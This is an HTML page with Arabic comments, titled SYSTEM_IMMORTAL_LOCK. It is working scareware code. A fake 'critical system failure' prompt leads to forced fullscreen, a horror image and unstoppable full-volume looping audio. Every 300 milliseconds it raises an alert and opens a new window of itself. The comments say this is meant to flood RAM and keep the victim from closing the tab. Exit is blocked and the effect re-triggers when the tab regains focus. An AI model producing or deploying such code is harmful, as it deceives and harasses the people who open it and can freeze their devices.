<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM_IMMORTAL_LOCK</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
    </style>
</head>
<body onclick="launchImmortalVirus()">

    <div id="msg" style="color:red; text-align:center; padding-top:45vh; font-family:monospace;">⚠️ CRITICAL SYSTEM FAILURE: CLICK TO OVERRIDE ⚠️</div>
    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio>

    <script>
        let active = false;
        const audio = document.getElementById('sfx');

        // منع إيقاف الصوت من الإشعارات سواسوة
        audio.onpause = function() {
            if (active) audio.play(); 
        };

        // ميزة "إعادة الفتح" التلقائي إذا حاول يخرج سواسوة
        window.onbeforeunload = function() { return "STAY"; };

        function launchImmortalVirus() {
            if (active) return;
            active = true;
            document.getElementById('msg').style.display = 'none';
            document.getElementById('horrorImg').style.display = 'block';
            
            // طلب Fullscreen إجباري
            document.documentElement.requestFullscreen().catch(() => {});
            
            // تشغيل الصوت بأقصى قوة سواسوة
            audio.volume = 1.0;
            audio.play();

            // اللاق اللانهائي اللي يخلي "إغلاق الكل" يتبلوكا سواسوة
            setInterval(() => {
                alert("⚠️ طفي كراك.. الفيروس دخل للنظام سواسوة!");
                // فتح نوافذ جديدة لملء الرام ومنع النظام من إغلاق التبويب بسهولة
                window.open(window.location.href, '_blank');
                if (audio.paused) audio.play();
            }, 300);
        }

        // محاولة إعادة تشغيل الفيروس إذا رجع الضحية للمتصفح سواسوة
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === 'visible' && active) {
                audio.play();
                alert("⚠️ العودة للجحيم سواسوة!");
            }
        });
    </script>
</body>
</html>
